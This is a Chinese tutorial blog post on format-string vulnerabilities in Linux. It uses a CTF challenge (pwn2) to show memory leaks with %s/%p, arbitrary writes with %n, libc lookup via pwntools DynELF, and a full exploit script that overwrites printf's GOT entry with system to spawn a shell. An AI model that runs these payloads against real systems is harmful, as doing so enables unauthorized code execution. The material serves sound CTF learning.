---
title: Linux 格式化字符串漏洞利用
tags: [Linux]
date: 2017-05-18 22:32
---
目的是接触一些常见的漏洞，增加自己的视野。格式化字符串危害最大的就两点，一点是leak memory，一点就是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存地址的读写。下面结合着自己的学习经历，把漏洞详细的讲解一下，附上大量的实例。
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><blockquote>
<p>目的是接触一些常见的漏洞，增加自己的视野。格式化字符串危害最大的就两点，一点是leak memory，一点就是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存地址的读写。下面结合着自己的学习经历，把漏洞详细的讲解一下，附上大量的实例。</p>
</blockquote>
<p><div class="toc"><div class="toc">
<ul>
<li><a href="#0x01-漏洞简述">0x01 漏洞简述</a><ul>
<li><a href="#0x1-简介">0x1 简介</a></li>
<li><a href="#0x2-产生条件">0x2 产生条件</a></li>
</ul>
</li>
<li><a href="#0x02-内存读取">0x02 内存读取</a><ul>
<li><a href="#0x1-printf-参数格式">0x1 printf 参数格式</a></li>
<li><a href="#0x2-堆栈情况">0x2 堆栈情况</a></li>
<li><a href="#0x3-实例分析">0x3 实例分析</a><ul>
<li><a href="#1计算参数偏移个数">1计算参数偏移个数</a><ul>
<li><a href="#1-gdb调试">1 gdb调试</a></li>
<li><a href="#2-利用pwntools计算">2 利用pwntools计算</a></li>
</ul>
</li>
<li><a href="#2利用dynelf实现内存泄露">2利用DynELF实现内存泄露</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#0x03-内存写入">0x03 内存写入</a></li>
</ul>
</div>
</div>
</p>
<h1 id="0x01-漏洞简述">0x01 漏洞简述</h1>
<h2 id="0x1-简介">0x1 简介</h2>
<p>格式化字符串漏洞是一种常见的漏洞，原理和利用方法也很简单，主要利用方式就是实现内存任意读和写。前提是其中的参数可控。如果要深入理解漏洞必须进行大量的实验。</p>
<h2 id="0x2-产生条件">0x2 产生条件</h2>
<p>首先要有一个函数，比如read, 比如gets获取用户输入的数据储存到局部变量中，然后直接把该变量作为printf这类函数的第一个参数值，一般是循环执行</p>
<h1 id="0x02-内存读取">0x02 内存读取</h1>
<p>这是泄露内存的过程</p>
<h2 id="0x1-printf-参数格式">0x1 printf 参数格式</h2>
<pre class="prettyprint"><code class=" hljs perl">这部分来自icemakr的博客

<span class="hljs-number">32</span>位

读

<span class="hljs-string">'%{}$x'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)           // 读<span class="hljs-number">4</span>个字节
<span class="hljs-string">'%{}$p'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)           // 同上面
<span class="hljs-string">'${}$s'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)
写

<span class="hljs-string">'%{}$n'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)           // 解引用，写入四个字节
<span class="hljs-string">'%{}$hn'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)          // 解引用，写入两个字节
<span class="hljs-string">'%{}$hhn'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)         // 解引用，写入一个字节
<span class="hljs-string">'%{}$lln'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)         // 解引用，写入八个字节
<span class="hljs-number">64</span>位

读

<span class="hljs-string">'%{}$x'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>, num)      // 读<span class="hljs-number">4</span>个字节
<span class="hljs-string">'%{}$lx'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>, num)     // 读<span class="hljs-number">8</span>个字节
<span class="hljs-string">'%{}$p'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)           // 读<span class="hljs-number">8</span>个字节
<span class="hljs-string">'${}$s'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)
写

<span class="hljs-string">'%{}$n'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)           // 解引用，写入四个字节
<span class="hljs-string">'%{}$hn'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)          // 解引用，写入两个字节
<span class="hljs-string">'%{}$hhn'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)         // 解引用，写入一个字节
<span class="hljs-string">'%{}$lln'</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)         // 解引用，写入八个字节
<span class="hljs-variable">%1</span><span class="hljs-variable">$lx</span>: RSI
<span class="hljs-variable">%2</span><span class="hljs-variable">$lx</span>: RDX
<span class="hljs-variable">%3</span><span class="hljs-variable">$lx</span>: RCX
<span class="hljs-variable">%4</span><span class="hljs-variable">$lx</span>: R8
<span class="hljs-variable">%5</span><span class="hljs-variable">$lx</span>: R9
<span class="hljs-variable">%6</span><span class="hljs-variable">$lx</span>: 栈上的第一个QWORD</code></pre>
<h2 id="0x2-堆栈情况">0x2 堆栈情况</h2>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170518215823110?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>当<code>printf("%s%d%d%d")</code>后面没有参数时，会打印后面的堆栈值。如果有read等函数，内存值可控，就可以实现内存任意读、任意写。</p>
<p>在64位环境下的格式化字符串利用又是另一回事，在这里稍微的提一下，以免其他同学在走错道 <br>
<code>程序为64位，在64位下，函数前6个参数依次保存在rdi、rsi、rdx、rcx、r8和r9寄存器中（也就是说，若使用”x$”，当1&lt;=x&lt;=6时，指向的应该依次是上述这6个寄存器中保存的数值），而从第7个参数开始，依然会保存在栈中。故若使用”x$”，则从x=7开始，我们就可以指向栈中数据了。</code></br></p>
<h2 id="0x3-实例分析">0x3 实例分析</h2>
<p>这里选用广东省红帽杯的pwn2来具体说明。 <br>
首先看一下IDA反汇编代码</br></p>
<pre class="prettyprint"><code class=" hljs cpp">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )
  {
    <span class="hljs-built_in">memset</span>(&amp;v2, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>u);
    read(<span class="hljs-number">0</span>, &amp;v2, <span class="hljs-number">0x400</span>u);
    <span class="hljs-built_in">printf</span>((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;v2);
    fflush(stdout);
  }</code></pre>
<p>我们发现了read函数，printf函数标准的格式化字符串漏洞。</p>
<h3 id="1计算参数偏移个数">1计算参数偏移个数</h3>
<p>这里有两种方式</p>
<h4 id="1-gdb调试">(1) gdb调试</h4>
<p>在printf之前设置断点，0x0804852E <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170519104125071?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
单步进入sprintf函数中，查看堆栈值 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170519104136587?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
我们发现了我们可控的内存距离sprintf之间的距离为7</br></img></br></br></img></br></p>
<h4 id="2-利用pwntools计算">(2) 利用pwntools计算</h4>
<p>利用FmStr函数计算</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-comment"># coding:utf-8 </span>
<span class="hljs-comment"># io = process('./pwn2')</span>
<span class="hljs-comment"># io =remote('106.75.93.221', 20003)</span>
elf = ELF(<span class="hljs-string">'./pwn2'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(payload)</span>:</span>
    io = process(<span class="hljs-string">'./pwn2'</span>)
    io.sendline(payload)
    info = io.recv()
    io.close
    <span class="hljs-keyword">return</span> info
autofmt = FmtStr(test)
<span class="hljs-keyword">print</span> autofmt.offset</code></pre>
<h3 id="2利用dynelf实现内存泄露">2利用DynELF实现内存泄露</h3>
<p>在这里我先介绍一下DynELF泄露内存的原理，采用<a href="http://www.jianshu.com/p/097e211cd9eb">这篇博客里写的</a></p>
<blockquote>
<p>我们应该怎么才能根据已知的函数地址来得到目标函数地址,需要有一下条件 <br>
  1.我们拥有从Linux发型以来所有版本的 libc 文件 <br>
  2.我们已知至少两个函数函数在目标主机中的真实地址 <br>
  那么我们是不是可以用第二个条件去推测目标主机的 libc 版本呢 ? <br>
  我们来进行进一步的分析 : <br>
  关于条件二 : <br>
  这里我们可以注意到 : printf 是可以被我们循环调用的 <br>
  因此可以进行连续的内存泄露 <br>
  我们可以将多个 got 表中的函数地址泄露出来 , <br>
  我们这样就可以的至少两个函数的地址 , 条件二满足 <br>
  关于条件一 : <br>
  哈哈~对了 , 这么有诱惑力的事情一定已经有人做过了 , 这里给出一个网站 : <a href="http://libcdb.com/">http://libcdb.com/</a> , 大名鼎鼎 pwntools 中的 DynELF 就是根据这个原理运作的 <br>
  两个条件都满足 , 根据这些函数之间的偏移去筛选出 libc 的版本 <br>
  这样我们就相当于得到了目标服务器的 libc 文件 , 达到了同样的效果</br></br></br></br></br></br></br></br></br></br></br></br></br></p>
</blockquote>
<p>以上是原理，其实说白了就是要利用能够打印指定内存的函数</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#coding:utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
sh = process(<span class="hljs-string">'./pwn2'</span>)
elf = ELF(<span class="hljs-string">'./pwn2'</span>)
<span class="hljs-comment">#计算偏移</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(payload)</span>:</span>
    temp = process(<span class="hljs-string">'./pwn2'</span>)
    temp.sendline(payload)
    info = temp.recv()
    temp.close()
    <span class="hljs-keyword">return</span> info

auto = FmtStr(test)
<span class="hljs-keyword">print</span> auto.offset
<span class="hljs-comment">#泄露内存 因为函数本来可以循环执行所以不用rop链闭合</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(addr)</span>:</span>
    payload = <span class="hljs-string">'A%9$s'</span><span class="hljs-comment">#这里需要注意一下 为了精确泄露内存用字符定下位</span>
    payload += <span class="hljs-string">'AAA'</span>
    payload += p32(addr)
    sh.sendline(payload)
    sh.recvuntil(<span class="hljs-string">'A'</span>)
    content = sh.recvuntil(<span class="hljs-string">'AAA'</span>)
    <span class="hljs-comment"># content = sh.recv(4)</span>
    <span class="hljs-keyword">print</span> content
    <span class="hljs-keyword">if</span>(len(content) == <span class="hljs-number">3</span>):
        <span class="hljs-keyword">print</span> <span class="hljs-string">'[*] NULL'</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">'\x00'</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">print</span> <span class="hljs-string">'[*] %#x ---&gt; %s'</span> % (addr, (content[<span class="hljs-number">0</span>:-<span class="hljs-number">3</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>).encode(<span class="hljs-string">'hex'</span>))
        <span class="hljs-keyword">print</span> len(content)
        <span class="hljs-keyword">return</span> content[<span class="hljs-number">0</span>:-<span class="hljs-number">3</span>]
<span class="hljs-comment">#-------- leak system</span>
d = DynELF(leak, elf=ELF(<span class="hljs-string">'./pwn2'</span>))
system_addr = d.lookup(<span class="hljs-string">'system'</span>,<span class="hljs-string">'libc'</span>)<span class="hljs-comment">#意思是在libc中寻找system地址</span>
log.info(<span class="hljs-string">'system_addr:'</span> + hex(system_addr))</code></pre>
<h1 id="0x03-内存写入">0x03 内存写入</h1>
<p>首先分析一个简单点的程序</p>
<pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-preprocessor">#include &lt;stdio.h&gt; </span>
<span class="hljs-keyword">int</span> main() {
    <span class="hljs-keyword">int</span> flag=<span class="hljs-number">5</span> ;
    <span class="hljs-keyword">int</span> *p = &amp;flag;
    <span class="hljs-keyword">char</span> a[<span class="hljs-number">100</span>];
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>,a);
    <span class="hljs-built_in">printf</span>(a);
    <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">2000</span>)
    {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"good\n"</span> );
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>
<p>利用gdb调试一下，在printf处设断点。查看一下堆栈的状况 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170519125819027?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
发现偏移为5 于是构造<code>%010x%010x%010x%01970x%n</code> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170519125905153?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
这里只是对于flag内存的修改，并没有达到任意修改的效果，任意修改需要计算偏移利用写好内存地址，利用%n直接修改。下面继续pwn2的讲解</br></img></br></br></img></br></p>
<hr>
<p>在pwntools中有现成的函数可以使用<code>fmtstr_payload</code>可以实现修改任意内存 <br>
<code>fmtstr_payload(auto.offset, {printf_got: system_addr})</code>(偏移，{原地址：目的地址})</br></p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
sh = process(<span class="hljs-string">'./pwn2'</span>)
elf = ELF(<span class="hljs-string">'./pwn2'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(payload)</span>:</span>
    temp = process(<span class="hljs-string">'./pwn2'</span>)
    temp.sendline(payload)
    info = temp.recv()
    temp.close()
    <span class="hljs-keyword">return</span> info

auto = FmtStr(test)
<span class="hljs-keyword">print</span> auto.offset


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(addr)</span>:</span>
    payload = <span class="hljs-string">'A%9$s'</span>
    payload += <span class="hljs-string">'AAA'</span>
    payload += p32(addr)
    sh.sendline(payload)
    sh.recvuntil(<span class="hljs-string">'A'</span>)
    content = sh.recvuntil(<span class="hljs-string">'AAA'</span>)
    <span class="hljs-comment"># content = sh.recv(4)</span>
    <span class="hljs-keyword">print</span> content
    <span class="hljs-keyword">if</span>(len(content) == <span class="hljs-number">3</span>):
        <span class="hljs-keyword">print</span> <span class="hljs-string">'[*] NULL'</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">'\x00'</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">print</span> <span class="hljs-string">'[*] %#x ---&gt; %s'</span> % (addr, (content[<span class="hljs-number">0</span>:-<span class="hljs-number">3</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>).encode(<span class="hljs-string">'hex'</span>))
        <span class="hljs-keyword">print</span> len(content)
        <span class="hljs-keyword">return</span> content[<span class="hljs-number">0</span>:-<span class="hljs-number">3</span>]
<span class="hljs-comment">#-------- leak system</span>
d = DynELF(leak, elf=ELF(<span class="hljs-string">'./pwn2'</span>))
system_addr = d.lookup(<span class="hljs-string">'system'</span>,<span class="hljs-string">'libc'</span>)
log.info(<span class="hljs-string">'system_addr:'</span> + hex(system_addr))

<span class="hljs-comment">#-------- change GOT</span>
printf_got = elf.got[<span class="hljs-string">'printf'</span>]
log.info(hex(printf_got))

payload = fmtstr_payload(auto.offset, {printf_got: system_addr})
sh.sendline(payload)

payload = <span class="hljs-string">'/bin/sh\x00'</span>
sh.sendline(payload)

sh.interactive()</code></pre></hr></div>